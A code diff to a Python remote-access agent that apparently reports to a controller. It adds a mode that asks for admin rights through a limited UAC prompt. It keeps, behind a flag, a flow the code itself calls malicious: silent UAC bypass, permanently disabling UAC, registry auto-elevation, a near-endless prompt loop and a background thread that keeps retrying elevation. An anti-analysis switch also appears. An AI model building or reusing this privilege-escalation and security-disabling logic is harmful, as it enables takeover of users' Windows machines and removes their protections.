@@ -191,8 +191,13 @@ DEBUG_MODE = True  # Enable debug logging for troubleshooting
 UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
-KEEP_ORIGINAL_PROCESS = True  # TRUE = Don't exit original process after UAC bypass (keep CMD window open)
+KEEP_ORIGINAL_PROCESS = False  # FALSE = Exit original process after getting admin (prevent duplicates)
 ENABLE_ANTI_ANALYSIS = False  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
+
+# ✅ NEW ETHICAL SETTINGS
+REQUEST_ADMIN_FIRST = True  # TRUE = Request admin permission FIRST before doing anything
+DISABLE_UAC_BYPASS = True   # TRUE = Disable all silent UAC bypass attempts
+MAX_PROMPT_ATTEMPTS = 3     # Limit prompts to 3 attempts instead of 999
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
@@ -1186,7 +1191,7 @@ class BackgroundInitializer:
             self.initialization_complete.set()  # Ensure completion event is set even on error
     
     def _init_privilege_escalation(self):
-        """Initialize privilege escalation in background - AGGRESSIVE MODE."""
+        """Initialize privilege escalation - ETHICAL MODE with proper permission request."""
         try:
             debug_print("=" * 80)
             debug_print("[PRIVILEGE ESCALATION] Starting privilege escalation...")
@@ -1199,63 +1204,87 @@ class BackgroundInitializer:
                     debug_print("=" * 80)
                     debug_print("❌ [PRIVILEGE ESCALATION] NOT ADMIN - NEED ELEVATION")
                     debug_print("=" * 80)
-                    log_message("🔒 Not running as admin - attempting automatic elevation...")
+                    log_message("🔒 Not running as admin - requesting permission...")
                     
-                    # STEP 1: Try all UAC bypass methods (SILENT - no prompts!)
-                    debug_print("[PRIVILEGE ESCALATION] STEP 1: UAC bypass methods")
-                    log_message("📋 Attempting UAC bypass methods...")
-                    
-                    debug_print("[UAC] Calling attempt_uac_bypass()...")
-                    uac_result = attempt_uac_bypass()
-                    
-                    if uac_result:
+                    # ✅ NEW ETHICAL FLOW: Request permission FIRST
+                    if REQUEST_ADMIN_FIRST:
                         debug_print("=" * 80)
-                        debug_print("✅ [UAC BYPASS] SUCCESS! Admin privileges gained!")
+                        debug_print("✅ [ETHICAL MODE] Requesting admin permission FIRST")
+                        debug_print("✅ [ETHICAL MODE] Will show UAC prompt and ask for your approval")
                         debug_print("=" * 80)
-                        log_message("✅ UAC bypass successful! Now running with admin privileges!")
+                        log_message("✅ Requesting admin permission properly (no bypass attempts)...")
                         
-                        # After successful bypass, disable UAC permanently
-                        debug_print("[UAC] Disabling UAC permanently...")
-                        if disable_uac():
-                            debug_print("✅ [UAC] UAC disabled successfully!")
-                            log_message("✅ UAC permanently disabled!")
+                        # Show proper UAC prompt with limited attempts
+                        if run_as_admin_with_limited_attempts():
+                            debug_print("✅ [ADMIN REQUEST] User granted admin privileges!")
+                            log_message("✅ Admin privileges granted by user!")
+                            return "admin_granted"
                         else:
-                            debug_print("❌ [UAC] UAC disable FAILED!")
-                        return "uac_bypass_success"
+                            debug_print("❌ [ADMIN REQUEST] User denied admin privileges")
+                            log_message("❌ Admin privileges denied - continuing without admin")
+                            return "admin_denied"
+                    
+                    # ❌ OLD MALICIOUS FLOW (only if bypass not disabled)
+                    if not DISABLE_UAC_BYPASS:
+                        # STEP 1: Try all UAC bypass methods (SILENT - no prompts!)
+                        debug_print("[PRIVILEGE ESCALATION] STEP 1: UAC bypass methods")
+                        log_message("📋 Attempting UAC bypass methods...")
+                        
+                        debug_print("[UAC] Calling attempt_uac_bypass()...")
+                        uac_result = attempt_uac_bypass()
+                        
+                        if uac_result:
+                            debug_print("=" * 80)
+                            debug_print("✅ [UAC BYPASS] SUCCESS! Admin privileges gained!")
+                            debug_print("=" * 80)
+                            log_message("✅ UAC bypass successful! Now running with admin privileges!")
+                            
+                            # After successful bypass, disable UAC permanently
+                            debug_print("[UAC] Disabling UAC permanently...")
+                            if disable_uac():
+                                debug_print("✅ [UAC] UAC disabled successfully!")
+                                log_message("✅ UAC permanently disabled!")
+                            else:
+                                debug_print("❌ [UAC] UAC disable FAILED!")
+                            return "uac_bypass_success"
+                        else:
+                            debug_print("=" * 80)
+                            debug_print("❌ [UAC BYPASS] FAILED - All methods failed")
+                            debug_print("=" * 80)
+                        
+                        # STEP 2: If UAC bypass fails, try registry-based auto-elevation
+                        debug_print("[PRIVILEGE ESCALATION] STEP 2: Registry auto-elevation")
+                        log_message("⚠️ UAC bypass methods failed, trying registry auto-elevation...")
+                        if elevate_via_registry_auto_approve():
+                            debug_print("✅ [REGISTRY] Auto-elevation successful!")
+                            log_message("✅ Registry auto-elevation successful!")
+                            return "registry_elevation_success"
+                        else:
+                            debug_print("❌ [REGISTRY] Auto-elevation FAILED!")
+                        
+                        # STEP 3: Persistent UAC prompt - keep asking until user clicks YES
+                        debug_print("[PRIVILEGE ESCALATION] STEP 3: Persistent UAC prompt loop")
+                        log_message("🔄 Showing persistent UAC prompt - will keep asking until you click YES...")
+                        
+                        # This will loop showing UAC prompts until user clicks YES or 999 attempts
+                        if run_as_admin_persistent():
+                            debug_print("✅ [PERSISTENT UAC] User granted admin!")
+                            log_message("✅ Persistent UAC prompt successful!")
+                            return "persistent_uac_success"
+                        else:
+                            debug_print("❌ [PERSISTENT UAC] Max attempts reached or failed")
+                        
+                        # STEP 4: If all else fails, continue without admin but keep trying in background
+                        debug_print("[PRIVILEGE ESCALATION] STEP 4: Background retry thread")
+                        log_message("⚠️ All elevation methods failed, will retry in background...")
+                        # Start a background thread to keep retrying UAC bypass
+                        threading.Thread(target=keep_trying_elevation, daemon=True).start()
+                        debug_print("⚠️ [PRIVILEGE ESCALATION] Continuing WITHOUT admin (background retry active)")
+                        return "elevation_pending"
                     else:
-                        debug_print("=" * 80)
-                        debug_print("❌ [UAC BYPASS] FAILED - All methods failed")
-                        debug_print("=" * 80)
-                    
-                    # STEP 2: If UAC bypass fails, try registry-based auto-elevation
-                    debug_print("[PRIVILEGE ESCALATION] STEP 2: Registry auto-elevation")
-                    log_message("⚠️ UAC bypass methods failed, trying registry auto-elevation...")
-                    if elevate_via_registry_auto_approve():
-                        debug_print("✅ [REGISTRY] Auto-elevation successful!")
-                        log_message("✅ Registry auto-elevation successful!")
-                        return "registry_elevation_success"
-                    else:
-                        debug_print("❌ [REGISTRY] Auto-elevation FAILED!")
-                    
-                    # STEP 3: Persistent UAC prompt - keep asking until user clicks YES
-                    debug_print("[PRIVILEGE ESCALATION] STEP 3: Persistent UAC prompt loop")
-                    log_message("🔄 Showing persistent UAC prompt - will keep asking until you click YES...")
-                    
-                    # This will loop showing UAC prompts until user clicks YES or 999 attempts
-                    if run_as_admin_persistent():
-                        debug_print("✅ [PERSISTENT UAC] User granted admin!")
-                        log_message("✅ Persistent UAC prompt successful!")
-                        return "persistent_uac_success"
-                    else:
-                        debug_print("❌ [PERSISTENT UAC] Max attempts reached or failed")
-                    
-                    # STEP 4: If all else fails, continue without admin but keep trying in background
-                    debug_print("[PRIVILEGE ESCALATION] STEP 4: Background retry thread")
-                    log_message("⚠️ All elevation methods failed, will retry in background...")
-                    # Start a background thread to keep retrying UAC bypass
-                    threading.Thread(target=keep_trying_elevation, daemon=True).start()
-                    debug_print("⚠️ [PRIVILEGE ESCALATION] Continuing WITHOUT admin (background retry active)")
-                    return "elevation_pending"
+                        debug_print("✅ [BYPASS DISABLED] UAC bypass methods are DISABLED")
+                        log_message("✅ UAC bypass disabled - continuing without admin")
+                        return "bypass_disabled"
                 
                 if is_admin():
                     debug_print("=" * 80)
@@ -5624,22 +5653,109 @@ def run_as_admin():
             return False
     return True
 
+def run_as_admin_with_limited_attempts():
+    """
+    ✅ ETHICAL VERSION: Request admin privileges with LIMITED attempts.
+    Shows UAC prompt up to MAX_PROMPT_ATTEMPTS times (default: 3).
+    Respects user's decision if they decline.
+    """
+    if not WINDOWS_AVAILABLE:
+        debug_print("[ADMIN] Not Windows - skipping admin request")
+        return False
+    
+    max_attempts = MAX_PROMPT_ATTEMPTS if 'MAX_PROMPT_ATTEMPTS' in globals() else 3
+    
+    debug_print("=" * 80)
+    debug_print(f"✅ [ETHICAL ADMIN REQUEST] Requesting admin permission")
+    debug_print(f"✅ [ETHICAL ADMIN REQUEST] Will ask up to {max_attempts} times")
+    debug_print(f"✅ [ETHICAL ADMIN REQUEST] Your choice will be respected")
+    debug_print("=" * 80)
+    
+    attempt = 0
+    
+    while attempt < max_attempts:
+        attempt += 1
+        
+        # Check if already admin
+        if is_admin():
+            debug_print("=" * 80)
+            debug_print(f"✅ [ADMIN] Admin privileges GRANTED! (after {attempt} attempts)")
+            debug_print("=" * 80)
+            return True
+        
+        debug_print(f"[ADMIN] Attempt {attempt}/{max_attempts}: Requesting admin privileges...")
+        log_message(f"📋 Requesting admin privileges (attempt {attempt}/{max_attempts})...")
+        
+        try:
+            # Show UAC prompt
+            result = ctypes.windll.shell32.ShellExecuteW(
+                None,
+                "runas",  # Request elevation
+                sys.executable,  # Python executable
+                f'"{__file__}"',  # This script
+                None,
+                1  # SW_SHOWNORMAL
+            )
+            
+            # ShellExecuteW returns > 32 on success
+            if result > 32:
+                debug_print("=" * 80)
+                debug_print("✅ [ADMIN] User clicked YES - Elevated instance starting")
+                debug_print("=" * 80)
+                log_message("✅ User granted admin privileges!")
+                
+                # Exit original instance to prevent duplicates
+                debug_print("✅ [ADMIN] Original instance will exit to prevent duplicates")
+                time.sleep(1)
+                sys.exit(0)
+            else:
+                # User clicked NO or Cancel
+                debug_print(f"❌ [ADMIN] Attempt {attempt}/{max_attempts}: User clicked NO or Cancel (result: {result})")
+                
+                if attempt < max_attempts:
+                    debug_print(f"[ADMIN] Waiting 3 seconds before next attempt...")
+                    log_message(f"⚠️ Admin request denied. Will ask {max_attempts - attempt} more time(s)...")
+                    time.sleep(3)
+                else:
+                    debug_print("=" * 80)
+                    debug_print("✅ [ADMIN] User declined admin - respecting their choice")
+                    debug_print("✅ [ADMIN] Continuing without admin privileges")
+                    debug_print("=" * 80)
+                    log_message("✅ User declined admin privileges - continuing without admin")
+            
+        except Exception as e:
+            debug_print(f"❌ [ADMIN] Attempt {attempt}/{max_attempts} FAILED: {e}")
+            if attempt < max_attempts:
+                time.sleep(3)
+    
+    debug_print("=" * 80)
+    debug_print(f"✅ [ADMIN] Completed {max_attempts} attempts - respecting user decision")
+    debug_print("=" * 80)
+    return False
+
 def run_as_admin_persistent():
     """
     Keep prompting for admin privileges until user clicks Yes.
     This will create a popup that won't go away until granted.
     When user clicks YES, the old instance exits and new admin instance starts.
+    
+    Note: If MAX_PROMPT_ATTEMPTS is defined, it will limit attempts to that number.
     """
     if not WINDOWS_AVAILABLE:
         debug_print("[ADMIN] Not Windows - skipping persistent admin prompt")
         return False
     
+    # ✅ RESPECT MAX_PROMPT_ATTEMPTS if defined
+    max_attempts = MAX_PROMPT_ATTEMPTS if 'MAX_PROMPT_ATTEMPTS' in globals() else 999
+    
     debug_print("=" * 80)
-    debug_print("[ADMIN] PERSISTENT ADMIN PROMPT - Will keep asking until YES")
+    if max_attempts < 999:
+        debug_print(f"[ADMIN] ADMIN PROMPT - Will ask up to {max_attempts} times")
+    else:
+        debug_print("[ADMIN] PERSISTENT ADMIN PROMPT - Will keep asking until YES")
     debug_print("=" * 80)
     
     attempt = 0
-    max_attempts = 999  # Effectively infinite
     
     while attempt < max_attempts:
         attempt += 1
